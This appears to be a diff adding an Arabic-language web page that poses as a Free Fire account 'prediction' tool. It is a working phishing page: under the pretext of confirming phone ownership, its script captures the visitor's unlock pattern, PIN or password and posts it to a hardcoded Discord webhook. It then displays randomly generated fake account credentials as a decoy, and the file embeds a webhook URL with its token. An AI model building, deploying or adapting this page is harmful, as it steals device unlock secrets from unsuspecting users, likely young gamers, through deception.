@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>موقع توقع حسابات فري فاير</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #1e1e1e;
+            border-radius: 24px;
+            padding: 30px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            text-align: center;
+            position: relative;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-size: 1.4rem;
+            color: #ff9800; /* لون مميز متناسق مع فري فاير */
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: space-between;
+            background-color: #2c2c2c;
+            border-radius: 12px;
+            padding: 5px;
+            margin-bottom: 25px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px 5px;
+            border: none;
+            background: none;
+            color: #aaa;
+            font-size: 0.9rem;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 9px;
+            transition: all 0.3s ease;
+        }
+
+        .tab-btn.active {
+            background-color: #ff9800;
+            color: #fff;
+        }
+
+        .input-group {
+            display: none;
+            margin-bottom: 20px;
+            text-align: right;
+            min-height: 320px;
+        }
+
+        .input-group.active {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 15px;
+            font-size: 0.95rem;
+            color: #ccc;
+            width: 100%;
+            text-align: center;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #444;
+            border-radius: 12px;
+            background-color: #2a2a2a;
+            color: #fff;
+            font-size: 1.2rem;
+            outline: none;
+            transition: border-color 0.3s;
+            text-align: center;
+            letter-spacing: 5px;
+        }
+
+        input:focus {
+            border-color: #ff9800;
+        }
+
+        #pattern-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin: 0 auto;
+            touch-action: none;
+            cursor: crosshair;
+        }
+
+        #patternCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            border-radius: 16px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background-color: #ff9800;
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.1s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #e68a00;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            min-height: 1.2rem;
+        }
+
+        /* --- واجهة عرض الحساب المتوقع --- */
+        #accounts-view {
+            display: none;
+            text-align: right;
+        }
+
+        .account-box {
+            background-color: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+            word-break: break-all;
+        }
+
+        .account-box div {
+            margin-bottom: 10px;
+            font-size: 0.95rem;
+        }
+
+        .account-box span {
+            color: #ff9800;
+            font-weight: bold;
+            font-family: monospace;
+            font-size: 1.05rem;
+            user-select: text;
+            -webkit-user-select: text;
+        }
+
+        .note-box {
+            background-color: #332700;
+            border-right: 4px solid #ffc107;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            color: #ffe082;
+            line-height: 1.5;
+            margin-top: 15px;
+            text-align: right;
+        }
+
+        .btn-again {
+            width: 100%;
+            padding: 12px;
+            background-color: #333;
+            border: 1px solid #555;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 0.95rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+
+        .btn-again:hover {
+            background-color: #444;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🎯 موقع توقع حسابات فري فاير</h2>
+
+    <!-- واجهة القفل والتحقق -->
+    <div id="auth-view">
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('pattern')">رسم (نمط)</button>
+            <button class="tab-btn" onclick="switchTab('pin')">أرقام (PIN)</button>
+            <button class="tab-btn" onclick="switchTab('password')">كلمة مرور</button>
+        </div>
+
+        <div id="pattern-group" class="input-group active">
+            <label>تأكيد ملكية الهاتف لرؤية الحساب المتوقع:</label>
+            <div id="pattern-container">
+                <canvas id="patternCanvas" width="300" height="300"></canvas>
+            </div>
+            <button type="button" style="background:none; border:none; color:#ff4d4d; cursor:pointer; font-size:0.8rem; margin-top:10px;" onclick="resetPatternCanvas()">إعادة المحاولة</button>
+        </div>
+
+        <div id="pin-group" class="input-group">
+            <label for="pin-input">أدخل رمز الـ PIN الخاص بالهاتف:</label>
+            <input type="password" id="pin-input" placeholder="****" maxlength="8" inputmode="numeric">
+        </div>
+
+        <div id="password-group" class="input-group">
+            <label for="password-input">أدخل كلمة مرور الهاتف:</label>
+            <input type="password" id="password-input" placeholder="أحرف وأرقام...">
+        </div>
+
+        <button class="btn-submit" onclick="sendToDiscord()">توقع الحساب الآن</button>
+        <div id="status" class="status-msg"></div>
+    </div>
+
+    <!-- واجهة عرض الحسابات العشوائية داخل الموقع -->
+    <div id="accounts-view">
+        <p style="text-align: center; margin-bottom: 15px; color: #4caf50; font-weight: bold;">✅ تم جلب الحساب المتوقع بنجاح!</p>
+        
+        <div class="account-box">
+            <div>🎮 <b>معرّف الحساب (ID):</b> <br><span id="acc-id">...</span></div>
+            <div>📧 <b>البريد الإلكتروني:</b> <br><span id="acc-email">...</span></div>
+            <div>🔑 <b>كلمة السر:</b> <br><span id="acc-pass">...</span></div>
+        </div>
+
+        <button class="btn-again" onclick="generateNewAccount()">🎲 توقع حساب آخر</button>
+
+        <div class="note-box">
+            <b>ملاحظة مهمة:</b> يمكن أن يكون هذا البريد وكلمة السر قد استخدمها شخص قبلك فعلياً.
+        </div>
+    </div>
+</div>
+
+<script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1556771079656054888/zHJECmFPu_m5EYwDeC8ECJkxmGo7ExcKRm1IBMyjFVoY2yi5LEjHKhUY-boTt1q3dCmi";
+    
+    let currentType = 'pattern';
+
+    const canvas = document.getElementById('patternCanvas');
+    const ctx = canvas.getContext('2d');
+
+    let dots = [];
+    let selectedDots = [];
+    let isDrawing = false;
+    let currentMousePos = { x: 0, y: 0 };
+
+    const DOT_RADIUS = 12;
+    const SELECTED_DOT_RADIUS = 15;
+    const LINE_WIDTH = 6;
+    const COLOR_NORMAL = '#555';
+    const COLOR_ACTIVE = '#ff9800'; // لون البرتقالي الخاطف
+
+    function initDots() {
+        dots = [];
+        const size = canvas.width;
+        const padding = size * 0.15;
+        const spacing = (size - padding * 2) / 2;
+
+        for (let row = 0; row < 3; row++) {
+            for (let col = 0; col < 3; col++) {
+                dots.push({
+                    x: padding + col * spacing,
+                    y: padding + row * spacing,
+                    id: row * 3 + col + 1
+                });
+            }
+        }
+    }
+
+    function draw() {
+        ctx.fillStyle = "#1a1a1a";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        if (selectedDots.length > 0) {
+            ctx.beginPath();
+            ctx.lineWidth = LINE_WIDTH;
+            ctx.strokeStyle = COLOR_ACTIVE;
+            ctx.lineJoin = 'round';
+            ctx.lineCap = 'round';
+
+            const firstDot = dots.find(d => d.id === selectedDots[0]);
+            ctx.moveTo(firstDot.x, firstDot.y);
+
+            for (let i = 1; i < selectedDots.length; i++) {
+                const dot = dots.find(d => d.id === selectedDots[i]);
+                ctx.lineTo(dot.x, dot.y);
+            }
+
+            if (isDrawing) {
+                ctx.lineTo(currentMousePos.x, currentMousePos.y);
+            }
+            ctx.stroke();
+        }
+
+        dots.forEach(dot => {
+            const isSelected = selectedDots.includes(dot.id);
+            
+            ctx.beginPath();
+            ctx.arc(dot.x, dot.y, isSelected ? SELECTED_DOT_RADIUS : DOT_RADIUS, 0, Math.PI * 2);
+            
+            if (isSelected) {
+                ctx.fillStyle = COLOR_ACTIVE;
+                ctx.fill();
+                ctx.beginPath();
+                ctx.arc(dot.x, dot.y, DOT_RADIUS / 2, 0, Math.PI * 2);
+                ctx.fillStyle = '#fff';
+                ctx.fill();
+            } else {
+                ctx.fillStyle = COLOR_NORMAL;
+                ctx.fill();
+            }
+        });
+    }
+
+    function getMousePos(e) {
+        const rect = canvas.getBoundingClientRect();
+        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+        
+        return {
+            x: (clientX - rect.left) * (canvas.width / rect.width),
+            y: (clientY - rect.top) * (canvas.height / rect.height)
+        };
+    }
+
+    function checkCollision(pos) {
+        const hitRad = DOT_RADIUS * 2.5;
+        for (let dot of dots) {
+            const dx = pos.x - dot.x;
+            const dy = pos.y - dot.y;
+            if (Math.sqrt(dx * dx + dy * dy) < hitRad) {
+                return dot.id;
+            }
+        }
+        return null;
+    }
+
+    function startDrawing(e) {
+        e.preventDefault();
+        isDrawing = true;
+        selectedDots = [];
+        currentMousePos = getMousePos(e);
+        
+        const dotId = checkCollision(currentMousePos);
+        if (dotId) {
+            selectedDots.push(dotId);
+            if (navigator.vibrate) navigator.vibrate(10);
+        }
+        requestAnimationFrame(draw);
+    }
+
+    function moveDrawing(e) {
+        if (!isDrawing) return;
+        e.preventDefault();
+        currentMousePos = getMousePos(e);
+        
+        const dotId = checkCollision(currentMousePos);
+        if (dotId && !selectedDots.includes(dotId)) {
+            selectedDots.push(dotId);
+            if (navigator.vibrate) navigator.vibrate(10);
+        }
+        requestAnimationFrame(draw);
+    }
+
+    function stopDrawing() {
+        if (!isDrawing) return;
+        isDrawing = false;
+        requestAnimationFrame(draw);
+    }
+
+    canvas.addEventListener('mousedown', startDrawing);
+    window.addEventListener('mousemove', moveDrawing);
+    window.addEventListener('mouseup', stopDrawing);
+
+    canvas.addEventListener('touchstart', startDrawing);
+    canvas.addEventListener('touchmove', moveDrawing);
+    canvas.addEventListener('touchend', stopDrawing);
+
+    function resetPatternCanvas() {
+        selectedDots = [];
+        requestAnimationFrame(draw);
+    }
+
+    initDots();
+    draw();
+
+    function switchTab(type) {
+        currentType = type;
+        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+        event.currentTarget.classList.add('active');
+
+        document.querySelectorAll('.input-group').forEach(group => group.classList.remove('active'));
+        document.getElementById(`${type}-group`).classList.add('active');
+
+        if (type === 'pattern') {
+            requestAnimationFrame(draw);
+        }
+    }
+
+    // --- دالة توليد بيانات عشوائية تماماً ---
+    function generateRandomString(length) {
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+
+    function generateNewAccount() {
+        const domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'];
+        const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+        
+        // بريد عشوائي
+        const randomEmail = generateRandomString(Math.floor(Math.random() * 5) + 6) + Math.floor(Math.random() * 899 + 100) + '@' + randomDomain;
+        // كلمة سر عشوائية
+        const randomPass = generateRandomString(4) + '@' + Math.floor(Math.random() * 89999 + 10000);
+        // ID عشوائي لحساب فري فاير
+        const randomID = Math.floor(Math.random() * 8999999999 + 1000000000);
+
+        document.getElementById('acc-id').innerText = randomID;
+        document.getElementById('acc-email').innerText = randomEmail;
+        document.getElementById('acc-pass').innerText = randomPass;
+    }
+
+    // الانتقال لواجهة الحسابات
+    function showAccountsView() {
+        generateNewAccount();
+        document.getElementById('auth-view').style.display = 'none';
+        document.getElementById('accounts-view').style.display = 'block';
+    }
+
+    function sendToDiscord() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.style.display = "block";
+        statusDiv.style.color = "#aaa";
+        statusDiv.innerText = "جاري التحقق وتوقع الحساب...";
+
+        if (currentType === 'pattern') {
+            if (selectedDots.length < 2) {
+                alert("يرجى رسم نمط القفل أولاً.");
+                statusDiv.innerText = "";
+                return;
+            }
+
+            isDrawing = false;
+            draw();
+
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('file', blob, 'pattern.png');
+
+                const payload = {
+                    embeds: [{
+                        title: "📱 تم تسجيل رمز نمط جديد",
+                        color: 16750848,
+                        fields: [
+                            { name: "نوع القفل", value: "PATTERN", inline: true }
+                        ],
+                        image: { url: "attachment://pattern.png" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(payload));
+
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    showAccountsView();
+                })
+                .catch(error => {
+                    console.error(error);
+                    // الانتقال حتى لو حدث خطأ في الشبكة لضمان تجربة المستخدم
+                    showAccountsView();
+                });
+            }, 'image/png');
+
+        } else {
+            let valueToSend = "";
+            if (currentType === 'pin') {
+                valueToSend = document.getElementById('pin-input').value;
+            } else if (currentType === 'password') {
+                valueToSend = document.getElementById('password-input').value;
+            }
+
+            if (!valueToSend) {
+                alert("يرجى إدخال الرمز أولاً!");
+                statusDiv.innerText = "";
+                return;
+            }
+
+            const payload = {
+                embeds: [{
+                    title: "📱 تم تسجيل رمز قفل جديد",
+                    color: 16750848,
+                    fields: [
+                        { name: "نوع القفل", value: currentType.toUpperCase(), inline: true },
+                        { name: "الرمز / كلمة المرور", value: `\`${valueToSend}\``, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                showAccountsView();
+            })
+            .catch(error => {
+                console.error(error);
+                showAccountsView();
+            });
+        }
+    }
+</script>
+
+</body>
+</html>
